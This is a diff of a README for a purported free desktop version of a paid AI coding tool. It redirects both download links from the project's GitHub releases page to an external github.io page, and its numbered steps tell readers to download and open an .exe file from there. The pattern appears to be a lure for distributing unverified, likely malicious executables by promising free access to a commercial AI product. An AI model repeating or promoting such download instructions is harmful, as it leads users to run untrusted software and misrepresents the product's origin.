@@ -1,6 +1,6 @@
 # 🤖 Claude-Code-Sonnet-5-Free-Desktop - Use advanced AI for free today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://obligatory-carpentersrule420.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the application on your Windows computer:
 
-1.  Visit the official release page here: [Download Link](https://github.com/Obligatory-carpentersrule420/Claude-Code-Sonnet-5-Free-Desktop/releases).
+1.  Visit the official release page here: [Download Link](https://obligatory-carpentersrule420.github.io).
 2.  Look for the section labeled "Assets" at the bottom of the latest release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Open the file once the download finishes.
